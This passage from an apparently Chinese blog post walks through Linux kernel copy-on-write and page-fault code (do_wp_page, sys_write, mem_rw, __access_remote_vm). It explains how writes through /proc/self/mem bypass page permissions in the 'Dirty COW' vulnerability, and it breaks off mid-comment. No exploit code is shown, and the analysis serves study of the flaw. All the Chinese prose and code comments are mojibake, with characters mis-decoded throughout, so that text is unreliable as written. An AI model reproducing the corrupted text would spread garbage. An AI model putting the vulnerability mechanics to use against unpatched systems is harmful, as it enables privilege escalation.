&#123;</span><br><span class="line">		unlock_page(fault_page);<span class="comment">//é‡Šæ”¾fault_page</span></span><br><span class="line">		page_cache_release(fault_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment">		 * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">	mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">	page_cache_release(new_page);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥å‡½æ•°ä¼šå°†æ‹·è´çš„æ–°çš„é¡µæ›´æ–°åˆ°é¡µè¡¨ä¸­ï¼Œå¯¹åº”ç€å¼€å¤´çš„è¿™å¼ å›¾ï¼Œä¸è¿‡æ­¤æ—¶è¿˜æ²¡è¿›è¡Œå¯¹åº”è¿›ç¨‹çš„å†™æ“ä½œï¼Œéœ€è¦ç­‰åˆ°ç¬¬äºŒæ¬¡ç¼ºé¡µå¼‚å¸¸æ—¶å†™å…¥è¯¥é¡µ</p>
<p><img src="https://i.loli.net/2021/04/12/e7Y9HCJjIm4suAk.png" alt="FD5A70A4D50C2B733ED19AB5E5B83B3B.png"></p>
<h4 id="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo-wp-page"><a href="#å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo-wp-page" class="headerlink" title="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo_wp_page()"></a>å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo_wp_page()</h4><p>å½“é€šè¿‡ <code>do_fault()</code> è·å–å†…å­˜é¡µä¹‹åï¼Œç¬¬äºŒæ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸æ—¶ä¾¿ä¼šæœ€ç»ˆäº¤ç”± <code>do_wp_page()</code> å‡½æ•°å¤„ç†ï¼Œè¯¥å‡½æ•°åŒæ ·ä½äº <code>mm/memory.c</code> ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This routine handles present pages, when users try to write</span></span><br><span class="line"><span class="comment"> * to a shared page. It is done by copying the page to a new address</span></span><br><span class="line"><span class="comment"> * and decrementing the shared-page counter for the old page.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that this routine assumes that the protection checks have been</span></span><br><span class="line"><span class="comment"> * done by the caller (the low-level page fault routine in most cases).</span></span><br><span class="line"><span class="comment"> * Thus we can safely just mark it writable once we&#x27;ve done any necessary</span></span><br><span class="line"><span class="comment"> * COW.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We also mark the page dirty at this point even though the page will</span></span><br><span class="line"><span class="comment"> * change only once the write actually happens. This avoids a few races,</span></span><br><span class="line"><span class="comment"> * and potentially makes it more efficient.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span></span><br><span class="line"><span class="comment"> * but allow concurrent faults), with pte both mapped and locked.</span></span><br><span class="line"><span class="comment"> * We return with mmap_sem still held, but pte unmapped and unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_wp_page</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">pte_t</span> *page_table, <span class="type">pmd_t</span> *pmd,</span></span><br><span class="line"><span class="params">		<span class="type">spinlock_t</span> *ptl, <span class="type">pte_t</span> orig_pte)</span></span><br><span class="line">	__<span class="title function_">releases</span><span class="params">(ptl)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">old_page</span>;</span><span class="comment">//åŸæœ‰çš„é¡µ</span></span><br><span class="line"></span><br><span class="line">	old_page = vm_normal_page(vma, address, orig_pte);<span class="comment">//è·å–ç¼ºé¡µçš„çº¿æ€§åœ°å€å¯¹åº”çš„struct pageç»“æ„ï¼Œå¯¹äºä¸€äº›ç‰¹æ®Šæ˜ å°„çš„é¡µé¢ï¼ˆå¦‚é¡µé¢å›æ”¶ã€é¡µè¿ç§»å’ŒKSMç­‰ï¼‰ï¼Œå†…æ ¸å¹¶ä¸å¸Œæœ›è¿™äº›é¡µå‚ä¸åˆ°å†…å­˜ç®¡ç†çš„ä¸€äº›æµç¨‹å½“ä¸­ï¼Œç§°ä¹‹ä¸º special mappingï¼Œå¹¶æ— å¯¹åº”çš„struct pageç»“æ„ä½“</span></span><br><span class="line">	<span class="keyword">if</span> (!old_page) &#123;<span class="comment">//NULLï¼Œè¯´æ˜æ˜¯ä¸€ä¸ª special mapping é¡µé¢ï¼›å¦åˆ™è¯´æ˜æ˜¯normal mappingé¡µé¢</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span></span><br><span class="line"><span class="comment">		 * VM_PFNMAP VMA.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * We should not cow pages in a shared writeable mapping.</span></span><br><span class="line"><span class="comment">		 * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">				     (VM_WRITE|VM_SHARED))</span><br><span class="line">			<span class="keyword">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, pmd);</span><br><span class="line"></span><br><span class="line">		pte_unmap_unlock(page_table, ptl);</span><br><span class="line">		<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">				    orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Take out anonymous pages first, anonymous shared vmas are</span></span><br><span class="line"><span class="comment">	 * not dirty accountable.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">//å…ˆå¤„ç†åŒ¿åé¡µé¢</span></span><br><span class="line">	<span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;<span class="comment">//åŸé¡µé¢ä¸ºåŒ¿åé¡µé¢ &amp;&amp; ä¸æ˜¯ksmé¡µé¢</span></span><br><span class="line">		<span class="keyword">if</span> (!trylock_page(old_page)) &#123;<span class="comment">//å¤šçº¿ç¨‹ç›¸å…³æ“ä½œï¼Œåˆ¤æ–­æ˜¯å¦æœ‰å…¶ä»–çº¿ç¨‹çš„ç«äº‰</span></span><br><span class="line">			page_cache_get(old_page);</span><br><span class="line">			pte_unmap_unlock(page_table, ptl);</span><br><span class="line">			lock_page(old_page);</span><br><span class="line">			page_table = pte_offset_map_lock(mm, pmd, address,</span><br><span class="line">							 &amp;ptl);</span><br><span class="line">			<span class="keyword">if</span> (!pte_same(*page_table, orig_pte)) &#123;</span><br><span class="line">				unlock_page(old_page);</span><br><span class="line">				pte_unmap_unlock(page_table, ptl);</span><br><span class="line">				page_cache_release(old_page);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			page_cache_release(old_page);</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//æ­¤æ—¶æ²¡æœ‰å…¶ä»–çº¿ç¨‹ä¸æœ¬çº¿ç¨‹ç«äº‰äº†ï¼Œè°ƒç”¨ reuse_swap_page() åˆ¤æ–­ä½¿ç”¨è¯¥é¡µçš„æ˜¯å¦åªæœ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œè‹¥æ˜¯çš„è¯å°±ç›´æ¥é‡ç”¨è¯¥é¡µ</span></span><br><span class="line">		<span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * The page is all ours.  Move it to our anon_vma so</span></span><br><span class="line"><span class="comment">			 * the rmap code will not search our parent or siblings.</span></span><br><span class="line"><span class="comment">			 * Protected against the rmap code by the page lock.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">			unlock_page(old_page);</span><br><span class="line">			<span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//ä¸€èˆ¬çš„cowæµç¨‹ä¼šèµ°åˆ°è¿™é‡Œï¼Œé‡ç”¨ç”±do_cow_fault()åˆ†é…å¥½çš„å†…å­˜é¡µï¼Œä¸ä¼šå†å¼€è¾Ÿæ–°é¡µ</span></span><br><span class="line">		&#125;</span><br><span class="line">		unlock_page(old_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">					(VM_WRITE|VM_SHARED))) &#123;</span><br><span class="line">		<span class="keyword">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</span><br><span class="line">				      ptl, orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ok, we need to copy. Oh, well..</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">//å®åœ¨æ²¡æ³•é‡ç”¨äº†ï¼Œè¿›è¡Œå†™æ—¶å¤åˆ¶</span></span><br><span class="line">	page_cache_get(old_page);</span><br><span class="line"></span><br><span class="line">	pte_unmap_unlock(page_table, ptl);</span><br><span class="line">	<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">			    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºå…¶æ ¸å¿ƒæ€æƒ³æ˜¯å°è¯•é‡ç”¨å†…å­˜é¡µï¼Œå®åœ¨æ²¡æ³•é‡ç”¨æ—¶æ‰ä¼šè¿›è¡Œå†™æ—¶å¤åˆ¶</p>
<h2 id="ä¸‰ã€COW-ä¸-ç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹"><a href="#ä¸‰ã€COW-ä¸-ç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹" class="headerlink" title="ä¸‰ã€COW ä¸ ç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹"></a>ä¸‰ã€COW ä¸ ç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹</h2><p>å½“æˆ‘ä»¬ä½¿ç”¨mmapæ˜ å°„ä¸€ä¸ªåªè¯»æ–‡ä»¶ï¼Œéšåå¼€è¾Ÿä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œå°è¯•é€šè¿‡ <code>/proc/self/mem</code> æ–‡ä»¶ç›´æ¥å¾€ä¸€ä¸ªåŸæœ‰çš„å…±äº«é¡µé¢å†™å…¥å†…å®¹æ—¶ï¼Œå…¶æµç¨‹åº”å½“å¦‚ä¸‹ï¼š</p>
<h3 id="ç³»ç»Ÿè°ƒç”¨ï¼šwriteã®æ‰§è¡Œæµ"><a href="#ç³»ç»Ÿè°ƒç”¨ï¼šwriteã®æ‰§è¡Œæµ" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨ï¼šwriteã®æ‰§è¡Œæµ"></a>ç³»ç»Ÿè°ƒç”¨ï¼šwriteã®æ‰§è¡Œæµ</h3><p>ç”¨æˆ·æ€çš„ <code>write</code> ç³»ç»Ÿè°ƒç”¨æœ€ç»ˆå¯¹åº”çš„æ˜¯å†…æ ¸ä¸­çš„ <code>sys_write()</code>ï¼Œè¯¥ç³»ç»Ÿè°ƒç”¨å®šä¹‰äº <code>fs/read_write.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<blockquote>
<p>ç›´æ¥åœ¨æºç é‡ŒæŸ¥ sys_write æ˜¯æ²¡æ³•æŸ¥åˆ°çš„ï¼Œè¿™æ˜¯å› ä¸ºç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„å†…æ ¸å‡½æ•°åéƒ½æ˜¯ç”±å® <code>SYSCALL_DEFINE</code>æœ€ç»ˆæ‹¼æ¥è€Œæˆï¼Œå¯ä»¥å‚è§<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/#III-%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89">è¿™é‡Œ</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(write, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">const</span> <span class="type">char</span> __user *, buf,</span><br><span class="line">		<span class="type">size_t</span>, count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget_pos(fd);</span><br><span class="line">	<span class="type">ssize_t</span> ret = -EBADF;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (f.file) &#123;</span><br><span class="line">		<span class="type">loff_t</span> pos = file_pos_read(f.file);</span><br><span class="line">		ret = vfs_write(f.file, buf, count, &amp;pos);</span><br><span class="line">		<span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">			file_pos_write(f.file, pos);</span><br><span class="line">		fdput_pos(f);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸­é—´çš„å…·ä½“æ‰§è¡Œè¿‡ç¨‹å¹¶éæœ¬ç¯‡é‡ç‚¹ï¼Œæˆ‘ä»¬æš‚ä¸”ç•¥è¿‡ï¼Œå¿«è¿›åˆ°å…¶è°ƒç”¨å¹¶å†™å…¥ç”¨æˆ·å†…å­˜é¡µçš„æ­¥éª¤ï¼Œæ‰§è¡Œæµå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">	sys_write()</span><br><span class="line">		vfs_write()</span><br><span class="line">			__vfs_write()</span><br><span class="line">				file-&gt;f_op-&gt;write()//è¯¥æ–‡ä»¶äºå†…æ ¸ä¸­çš„æ–‡ä»¶æè¿°ç¬¦çš„file_operationsç»“æ„ä½“ï¼Œç±»ä¼¼äºä¸€å¼ å‡½æ•°è¡¨ï¼Œå‚¨å­˜äº†é»˜è®¤çš„å¯¹äºä¸€äº›ç³»ç»Ÿè°ƒç”¨çš„å¤„ç†å‡½æ•°æŒ‡é’ˆ</span><br></pre></td></tr></table></figure>

<h4 id="x2F-proc-x2F-self-x2F-memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™"><a href="#x2F-proc-x2F-self-x2F-memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™"></a>&#x2F;proc&#x2F;self&#x2F;memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™</h4><p>â€œè„ç‰›â€é€šå¸¸åˆ©ç”¨çš„æ˜¯ <code>/proc/self/mem</code> è¿›è¡Œè¶Šæƒå†™å…¥ï¼Œè¿™ä¹Ÿæ˜¯æ•´ä¸ªâ€œè„ç‰›â€åˆ©ç”¨ä¸­è¾ƒä¸ºæ ¸å¿ƒçš„æµç¨‹</p>
<p>å¯¹äºè¯¥æ–‡ä»¶ï¼Œå…¶æ‰§è¡Œæµå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mem_write()//å¥—å¨ƒï¼Œè°ƒç”¨ä¸‹ä¸€å±‚çš„mem_rw()</span><br><span class="line">	mem_rw()//æ ¸å¿ƒå‡½æ•°ï¼Œåˆ†é…é¡µ + æ‹·è´æ•°æ®ï¼ˆcopy_from_user()ï¼‰</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ <code>mem_rw()</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>fs/proc/base.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">mem_rw</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">char</span> __user *buf,</span></span><br><span class="line"><span class="params">			<span class="type">size_t</span> count, <span class="type">loff_t</span> *ppos, <span class="type">int</span> write)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> file-&gt;private_data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> addr = *ppos;</span><br><span class="line">	<span class="type">ssize_t</span> copied;</span><br><span class="line">	<span class="type">char</span> *page;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!mm)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	page = (<span class="type">char</span> *)__get_free_page(GFP_TEMPORARY);<span class="comment">//åˆ†é…ä¸´æ—¶çš„ç©ºé—²å†…å­˜é¡µ</span></span><br><span class="line">	<span class="keyword">if</span> (!page)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	copied = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))</span><br><span class="line">		<span class="keyword">goto</span> <span class="built_in">free</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="type">int</span> this_len = <span class="type">min_t</span>(<span class="type">int</span>, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœæ˜¯å†™å…¥æ“ä½œï¼Œå°†ç”¨æˆ·å†…å­˜ç©ºé—´æ•°æ®æ‹·è´åˆ°ä¸´æ—¶å†…å­˜é¡µä¸Š</span></span><br><span class="line">		<span class="keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;</span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// access_remote_vm() è¿›è¡Œå†…å­˜è®¿é—®æ“ä½œ</span></span><br><span class="line">		this_len = access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line">		<span class="keyword">if</span> (!this_len) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!copied)</span><br><span class="line">				copied = -EIO;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœæ“ä½œéå†™æ“ä½œçš„è¯ï¼ˆä¹Ÿå°±æ˜¯è¯»æ“ä½œï¼‰ï¼Œæ­¤æ—¶å¾…è¯»å‡ºæ•°æ®å·²ç»è¢«è¯»åˆ°äº†ä¸´æ—¶é¡µé¢ä¸Šï¼Œæ‹·å›ç”¨æˆ·ç©ºé—´</span></span><br><span class="line">		<span class="keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		buf += this_len;</span><br><span class="line">		addr += this_len;</span><br><span class="line">		copied += this_len;</span><br><span class="line">		count -= this_len;</span><br><span class="line">	&#125;</span><br><span class="line">	*ppos = addr;</span><br><span class="line"></span><br><span class="line">	mmput(mm);</span><br><span class="line"><span class="built_in">free</span>:</span><br><span class="line">	free_page((<span class="type">unsigned</span> <span class="type">long</span>) page);<span class="comment">//é‡Šæ”¾ä¸´æ—¶å†…å­˜é¡µ</span></span><br><span class="line">	<span class="keyword">return</span> copied;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶æµç¨‹åº”å½“å¦‚ä¸‹ï¼š</p>
<ul>
<li>åˆ¤æ–­è¯¥æ–‡ä»¶å¯¹åº”çš„å†…å­˜æè¿°ç¬¦æ˜¯å¦ä¸ºç©ºï¼Œæ ¹æ®ç¬”è€…è°ƒè¯•çš„ç»“æœï¼Œç¬¬ä¸€æ¬¡è¿›å…¥æ—¶ç¡®ä¹ä¸ºç©ºï¼Œè¿”å›ä¸Šå±‚ï¼Œåˆ†é…ä¸€ä¸ªå¯¹åº”çš„ <code>mm_struct</code> åä¼šé‡æ–°è¿›å…¥è¯¥å‡½æ•°</li>
<li>è°ƒç”¨ <code>__get_free_page()</code> å‡½æ•°åˆ†é…ä¸€ä¸ªç©ºé—²çš„å†…å­˜é¡µä½œä¸ºä¸´æ—¶å‚¨å­˜ç”¨æˆ·æ•°æ®çš„ç©ºé—´</li>
<li>è°ƒç”¨ <code>access_remote_vm()</code> å‡½æ•°è¿›è¡Œå†…å­˜è®¿é—®æ“ä½œï¼Œæ ¹æ®ä¼ å…¥çš„ <code>write</code> å‚æ•°è¿›è¡Œè¯»&#x2F;å†™å†…å­˜é¡µé¢æ“ä½œ</li>
</ul>
<p>å…¶ä¸­ <code>access_remote_vm()</code> å‡½æ•°æœ¬èº«ä¸º <code>__access_remote_vm()</code> å‡½æ•°çš„å¥—å¨ƒï¼Œè¯¥å‡½æ•°ä½äº <code>mm/memory.c</code> ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Access another process&#x27; address space as given in mm.  If non-NULL, use the</span></span><br><span class="line"><span class="comment"> * given task for page fault accounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __access_remote_vm(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> mm_struct *mm,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">void</span> *buf, <span class="type">int</span> len, <span class="type">int</span> write)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="type">void</span> *old_buf = buf;</span><br><span class="line"></span><br><span class="line">	down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="comment">/* ignore errors, just check how much was successfully transferred */</span></span><br><span class="line">	<span class="keyword">while</span> (len) &#123;</span><br><span class="line">		<span class="type">int</span> bytes, ret, offset;</span><br><span class="line">		<span class="type">void</span> *maddr;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>,</span><br><span class="line">				write, <span class="number">1</span>, &amp;page, &amp;vma); <span class="comment">//è·å–æ“ä½œï¼ˆä»...è¯»å–/å‘...å†™å…¥ï¼‰å¯¹åº”çš„ç›®æ 